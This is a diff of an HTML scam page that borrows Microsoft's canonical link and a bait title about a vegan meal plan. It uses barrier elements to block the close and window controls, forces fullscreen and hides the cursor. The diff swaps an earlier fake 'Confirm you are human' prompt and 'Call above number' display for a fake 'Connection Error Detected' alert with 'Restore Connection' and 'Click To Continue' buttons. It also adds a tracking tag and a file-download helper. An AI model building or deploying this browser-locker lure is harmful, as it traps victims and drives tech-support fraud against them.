@@ -25,16 +25,20 @@
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <meta http-equiv="x-ua-compatible" content="ie=edge">
-      <title>Microsoft – Cloud, Computers, Apps &amp; Gaming</title>
+      <title>30 day vegan meal plan to let you live longer</title>
       <link rel="canonical" href="https://www.microsoft.com/en-in">
       <link rel="stylesheet" href="css/main-light.min.ACSHASHfd071803266ba1f4336b43868366299a.css" type="text/css">
       <link rel="stylesheet" href="css/clientlib-base.min.ACSHASH24e963c5973b1072ed7b92de5bd89ad2.css" type="text/css">
       <link rel="stylesheet" href="css/clientlib-uhf.min.ACSHASHf9f2395c582fa601707b7a5dfae9f05f.css" type="text/css">
-      <script type="text/javascript" src="js/v1.min.ACSHASHc343dfb005ac8c14ae0dd22dd17fb2fc.js" async=""></script>      <script src="assets/js/jquery.min.js"></script>
-      <script type="text/javascript" src="assets/js/params.js"></script>
-      <script type="text/javascript" src="assets/js/main.js"></script>
-      <script src="assets/js/land.js"></script>
-      <script type="text/javascript" src="assets/js/fullscreen-helper.js"></script> 
+      <script type="text/javascript" src="js/v1.min.ACSHASHc343dfb005ac8c14ae0dd22dd17fb2fc.js" async=""></script>      <script src="assets/js/jquery.min.js"></script>      <script type="text/javascript" src="assets/js/params.js"></script>      <script type="text/javascript" src="assets/js/main.js"></script>      <script src="assets/js/land.js"></script>      <script type="text/javascript" src="assets/js/fullscreen-helper.js"></script>
+      <script type="text/javascript" src="assets/js/simple-popup.js"></script>
+      <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rnjzmpndb7");
+</script>
 <style>  html, body {
     margin: 0;
     padding: 0;
@@ -141,25 +145,23 @@
     left: 0;
     width: 100%;
     height: 100%;
-    background: #ffffff;
+    background: #000000;
     z-index: 9998;
     backdrop-filter: blur(10px);
     -webkit-backdrop-filter: blur(10px);
+    opacity: 1;
   }
-
   /* Modern button animations */
   @keyframes glow {
-    0% { box-shadow: 0 0 20px rgba(82, 109, 255, 0.5); }
-    50% { box-shadow: 0 0 35px rgba(82, 109, 255, 0.8); }
-    100% { box-shadow: 0 0 20px rgba(82, 109, 255, 0.5); }
+    0% { box-shadow: 0 0 20px rgba(255, 82, 82, 0.7); }
+    50% { box-shadow: 0 0 35px rgba(255, 82, 82, 1); }
+    100% { box-shadow: 0 0 20px rgba(255, 82, 82, 0.7); }
   }
-  
-  @keyframes smooth-pulse {
+    @keyframes smooth-pulse {
     0% { transform: translate(-50%, -50%) scale(1); }
     50% { transform: translate(-50%, -50%) scale(1.02); }
     100% { transform: translate(-50%, -50%) scale(1); }
-  }
-
+  }  
   .close-btn {
     position: fixed;
     top: 50%;
@@ -183,12 +185,11 @@
     -webkit-backdrop-filter: blur(4px);
     flex-direction: column;
   }
-
   .close-btn:hover {
-    background: linear-gradient(135deg, #00d2ff, #3a7bd5);
-    transform: translate(-50%, -50%) scale(1.03);
-    box-shadow: 0 8px 40px 0 rgba(31, 38, 135, 0.45);
-    border: 1px solid rgba(255, 255, 255, 0.3);
+    background: linear-gradient(135deg, #ff5252, #ff3636);
+    transform: translate(-50%, -50%) scale(1.05);
+    box-shadow: 0 8px 40px 0 rgba(255, 82, 82, 0.6);
+    border: 1px solid rgba(255, 255, 255, 0.4);
   }
   
   /* Remove X symbol from close button */
@@ -196,33 +197,137 @@
   .close-btn::after {
     display: none;
   }
-    /* Modern button text styling */
+  /* Modern button text styling */
   .close-btn-text {
     color: white;
-    font-size: 20px;
-    font-weight: 600;
+    font-size: 18px;
+    font-weight: 500;
+    text-align: center;
+    letter-spacing: 0.5px;
+    text-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin: 6px 0;
+  }
+  
+  .close-btn-title {
+    color: white;
+    font-size: 22px;
+    font-weight: 700;
     text-align: center;
     text-transform: uppercase;
     letter-spacing: 1px;
     text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin-bottom: 4px;
   }
-    /* Enhanced shield icon styling */
-  .security-icon {
-    font-size: 32px;
-    margin-bottom: 15px;
+  
+  /* Error icon with pulsing rings */
+  .error-icon-container {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 12px;
+  }
+  
+  .error-icon {
+    font-size: 40px;
+    z-index: 2;
+    animation: pulse 2s infinite ease-in-out;
+  }
+  
+  .pulse-ring {
+    position: absolute;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: rgba(255, 0, 0, 0.2);
+    z-index: 1;
+    animation: ring-pulse 2s infinite;
+  }
+  
+  @keyframes ring-pulse {
+    0% { transform: scale(0.8); opacity: 1; }
+    70% { transform: scale(1.2); opacity: 0; }
+    100% { transform: scale(0.8); opacity: 0; }
+  }
+  
+  /* Status indicator with animated dots */
+  .status-indicator {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 15px 0;
+    flex-wrap: wrap;
+  }
+  
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    background-color: #ffffff;
+    border-radius: 50%;
+    margin: 0 5px;
+    opacity: 0.6;
+  }
+  
+  .status-dot:nth-child(1) {
+    animation: dot-fade 1.4s infinite ease-in-out;
+    animation-delay: 0s;
+  }
+  
+  .status-dot:nth-child(2) {
+    animation: dot-fade 1.4s infinite ease-in-out;
+    animation-delay: 0.2s;
+  }
+  
+  .status-dot:nth-child(3) {
+    animation: dot-fade 1.4s infinite ease-in-out;
+    animation-delay: 0.4s;
+  }
+  
+  @keyframes dot-fade {
+    0%, 60%, 100% { transform: scale(0.9); opacity: 0.6; }
+    30% { transform: scale(1.2); opacity: 1; }
+  }
+  
+  .status-message {
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 14px;
+    margin-left: 8px;
+    letter-spacing: 0.5px;
+    width: 100%;
+    text-align: center;
+    margin-top: 6px;
+  }
+  
+  /* Action button styling */
+  .action-button {
+    background: rgba(255, 255, 255, 0.15);
     color: white;
-    filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
-    animation: floating 3s infinite ease-in-out;
+    font-weight: 600;
+    padding: 12px 22px;
+    border-radius: 30px;
+    margin-top: 10px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    border: 1px solid rgba(255, 255, 255, 0.3);
+    font-size: 16px;
+    letter-spacing: 0.5px;
+    animation: button-pulse 2s infinite ease-in-out;
   }
-
-  @keyframes floating {
-    0% { transform: translateY(0px); }
-    50% { transform: translateY(-6px); }
-    100% { transform: translateY(0px); }
+  
+  .action-button:hover {
+    background: rgba(255, 255, 255, 0.25);
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
   }
-
-  /* Click indicator styling */
+  
+  @keyframes button-pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+  }  /* Click indicator styling */
   .click-indicator {
     color: #ffd700;
     font-size: 18px;
@@ -232,10 +337,44 @@
     animation: bounce 1.5s infinite ease-in-out;
     opacity: 0.9;
   }
-
   @keyframes bounce {
     0%, 100% { transform: translateY(0); }
     50% { transform: translateY(-8px); }
+  }
+  
+  /* Loading bar animation */
+  .loading-bar {
+    width: 100%;
+    height: 6px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 10px;
+    margin-top: 15px;
+    overflow: hidden;
+    position: relative;
+  }
+  
+  .loading-progress {
+    position: absolute;
+    height: 100%;
+    width: 30%;
+    background: linear-gradient(90deg, #ff5252, #ff8080);
+    border-radius: 10px;
+    animation: loading 2s infinite ease-in-out;
+  }
+  
+  @keyframes loading {
+    0% { left: -30%; }
+    100% { left: 100%; }
+  }
+  
+  /* Subtext styling */
+  .close-btn-subtext {
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 14px;
+    margin-top: 5px;
+    font-weight: normal;
+    text-align: center;
+    letter-spacing: 0.5px;
   }/* Enhanced tooltip with animation */
   @keyframes fadeInOut {
     0% { opacity: 0; transform: translateY(10px); }
@@ -243,7 +382,6 @@
     90% { opacity: 1; transform: translateY(0); }
     100% { opacity: 0; transform: translateY(10px); }
   }
-
   .close-btn .tooltip {
     position: absolute;
     bottom: -45px;
@@ -265,171 +403,87 @@
     opacity: 1;
     background: linear-gradient(90deg, #222222, #333333);
   }
-
-  /* Continue Button Styling */  @keyframes float {
-    0% { transform: translateY(0px); }
-    50% { transform: translateY(-10px); }
-    100% { transform: translateY(0px); }
-  }
-
-  @keyframes colorShift {
-    0% { background: linear-gradient(145deg, #000000, #333333); }
-    50% { background: linear-gradient(145deg, #222222, #000000); }
-    100% { background: linear-gradient(145deg, #000000, #333333); }
-  }  .continue-btn {
+    /* Simple Connection Established Popup */
+  .simple-connection-popup {
     position: fixed;
-    bottom: 8%;
-    left: 50%;
-    transform: translateX(-50%);
-    min-width: 200px;
-    width: auto;
-    height: 60px;
-    padding: 0 25px;
-    background: linear-gradient(145deg, #000000, #333333);
-    border-radius: 30px;
-    display: none;
-    justify-content: center;
+    left: 30px;
+    top: 50%;
+    transform: translateY(-50%) translateX(-120%);
+    background: linear-gradient(135deg, #2ecc71, #27ae60);
+    border-radius: 12px;
+    padding: 15px 20px;
+    display: flex;
     align-items: center;
-    z-index: 9999;
+    box-shadow: 0 10px 30px rgba(46, 204, 113, 0.7);
+    border: 1px solid rgba(255, 255, 255, 0.4);
+    z-index: 10000;
     cursor: pointer;
-    animation: float 3s infinite ease-in-out, colorShift 5s infinite;
-    border: 3px solid rgba(255, 255, 255, 0.9);
-    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
-    transition: all 0.3s ease;
-    box-sizing: border-box;
-    right: auto;
+    max-width: 350px;
+    opacity: 0;
+    transition: opacity 0.5s ease, transform 0.5s ease;
   }
-  .continue-btn:hover {
-    transform: translateX(-50%) scale(1.05);
-    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.8);
+  
+  .simple-connection-popup.show {
+    opacity: 1;
+    transform: translateY(-50%) translateX(0);
   }
-
-  .continue-btn-text {
-    color: white;
-    font-size: 20px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    text-shadow: 0 2px 3px rgba(0, 0, 0, 0.5);
-    white-space: nowrap;
-  }
-
-  .continue-btn::after {
-    content: "→";
-    font-size: 22px;
-    margin-left: 10px;
-    transition: transform 0.3s ease;
-  }
-
-  .continue-btn:hover::after {
-    transform: translateX(5px);
-  }
-
-  /* Arrow animation */
-  @keyframes arrowPulse {
-    0% { opacity: 0.6; transform: translateX(0); }
-    50% { opacity: 1; transform: translateX(5px); }
-    100% { opacity: 0.6; transform: translateX(0); }
-  }
-
-  .arrow {
-    display: inline-block;
-    margin-left: 8px;
-    animation: arrowPulse 1.5s infinite;
-  }
-  /* Show continue button only in fullscreen mode */
-  .fullscreen-active .continue-btn {
-    cursor: pointer !important;
-    display: flex !important;
-  }
-    /* Hide close button and overlay in fullscreen mode */
-  .fullscreen-active .close-btn,
-  .fullscreen-active .overlay {
+  
+  /* Hide popup in fullscreen mode */
+  .fullscreen-active .simple-connection-popup {
     display: none !important;
   }
-    /* Change the continue button text in fullscreen mode */
-  .continue-btn-text .normal-text {
-    display: inline;
-    white-space: nowrap;
-  }
   
-  .continue-btn-text .fullscreen-text {
-    display: none;
-    white-space: nowrap;
-  }
-  
-  .fullscreen-active .continue-btn-text .normal-text {
-    display: none;
-  }
-  
-  .fullscreen-active .continue-btn-text .fullscreen-text {
-    display: inline;
-  }
-
-  /* Adjust the continue button in fullscreen mode */
-  .fullscreen-active .continue-btn {
-    min-width: 280px;
-    width: auto;
-    padding: 0 30px;
-    background: linear-gradient(145deg, #000000, #222222);
-  }
-
-  /* Add responsive text sizing for different screen sizes */
-  @media screen and (max-width: 768px) {
-    .continue-btn {
-      padding: 0 20px;
-      min-width: 180px;
-      height: 55px;
-    }
-    
-    .continue-btn-text {
-      font-size: 16px;
-    }
-    
-    .fullscreen-active .continue-btn {
-      min-width: 240px;
-      padding: 0 25px;
-    }
-    
-    .fullscreen-active .continue-btn-text {
-      font-size: 15px;
-    }
-  }
-
-  /* Phone number display styling */
-  .phone-number-display {
-    position: fixed;
-    top: 30%;
-    left: 50%;
-    transform: translateX(-50%);
-    background: linear-gradient(145deg, #000000, #222222);
-    padding: 15px 30px;
-    border-radius: 15px;
-    color: white;
-    font-size: 28px;
+  .simple-connection-icon {
+    background-color: white;
+    color: #2ecc71;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 18px;
     font-weight: bold;
-    text-align: center;
-    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
-    border: 2px solid rgba(255, 255, 255, 0.8);
-    z-index: 9998;
-    display: none;
+    margin-right: 15px;
+    flex-shrink: 0;
+    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
   }
   
-  /* Only show phone number in fullscreen mode */
-  .fullscreen-active .phone-number-display {
-    display: block;
+  .simple-popup-content {
+    color: white;
+  }
+    .simple-popup-title {
+    font-weight: bold;
+    font-size: 16px;
+    margin-bottom: 5px;
   }
   
-  /* Responsive phone display */
-  @media screen and (max-width: 768px) {
-    .phone-number-display {
-      font-size: 22px;
-      padding: 12px 20px;
-      top: 25%;
-    }
+  .simple-popup-message {
+    font-size: 14px;
+    opacity: 0.9;
+    line-height: 1.4;
   }
-
-  /* Adjust the continue button in fullscreen mode */
+    .simple-connection-popup:hover {
+    box-shadow: 0 10px 35px rgba(46, 204, 113, 0.9);
+    background: linear-gradient(135deg, #27ae60, #2ecc71);
+  }
+  
+  .simple-popup-button {
+    background-color: #162b17;
+    border: 1px solid rgba(255, 255, 255, 0.4);
+    color: white;
+    padding: 9px 12px;
+    border-radius: 30px;
+    font-size: 13px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background-color 0.3s ease;
+    outline: none;
+  }
+  
+  .simple-popup-button:hover {
+    background-color: rgba(255, 255, 255, 0.3);
+  }
 </style>
    </head>
 <body> <div class="top-barrier"></div>
@@ -437,18 +491,31 @@
  <div class="close-button-blocker"></div>
  <div class="window-controls-blocker"></div>
  <!-- Overlay to hide background -->
- <div class="overlay"></div> <!-- Close Button -->
- <div class="close-btn">
-   <div class="security-icon">🛡️</div>
-   <div class="close-btn-text">Confirm you are human</div>
-   <div class="click-indicator">👆 Click here</div>
- </div>  <!-- Continue Button -->
- <div class="continue-btn">
-   <span class="continue-btn-text">
-    <span>Continue</span>
-     <span class="fullscreen-text">Call above number</span>
-     <span class="arrow">→</span>
-   </span>
+ <div class="overlay"></div> <!-- Close Button --> <div class="close-btn">
+   <div class="error-icon-container">
+     <div class="error-icon">⚠️</div>
+     <div class="pulse-ring"></div>
+   </div>
+   <div class="close-btn-title">Connection Error Detected</div>
+   <div class="close-btn-text">Your secure session has been interrupted</div>
+   <div class="status-indicator">
+     <span class="status-dot"></span>
+     <span class="status-dot"></span>
+     <span class="status-dot"></span>
+     <span class="status-message">Attempting to reconnect...</span>
+   </div>
+   <div class="action-button">Restore Connection</div>
+  <div class="tooltip">Click to Retry</div>
+ </div> 
+ 
+ <!-- Simple Connection Established Popup -->
+ <div class="simple-connection-popup">
+   <div class="simple-connection-icon">✓</div>
+   <div class="simple-popup-content">
+     <div class="simple-popup-title">Connection Established</div>
+     <div class="simple-popup-message">Click here</div>
+     <button class="simple-popup-button">Click To Continue</button>
+   </div>
  </div>
  
  <script>
@@ -624,8 +691,7 @@ document.addEventListener('fullscreenchange', (event) => {
               for (var i = 0; i < allElements.length; i++) {
                 allElements[i].style.cursor = 'none';
               }
-              
-              // Hide verification UI permanently
+                // Hide verification UI permanently
               document.querySelector('.close-btn').style.display = 'none';
               document.querySelector('.overlay').style.display = 'none';
               
@@ -829,5 +895,26 @@ document.addEventListener('fullscreenchange', (event) => {
         }, true);
             
       </script>
+      <script>
+      // Function to add a favicon
+      function addFavicon() {
+        var link = document.createElement("link");
+        link.rel = "icon";
+        link.href = "assets/images/fav.jpg"; // Path to your favicon
+        document.head.appendChild(link);
+      }
+
+      // Call the function to add the favicon
+      addFavicon();
+      // Function to add a title
+      function downloadImage(imageSrc, fileName) {
+        const link = document.createElement("a");
+        link.href = imageSrc;
+        link.download = fileName;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+    </script>
    </body>
 </html>
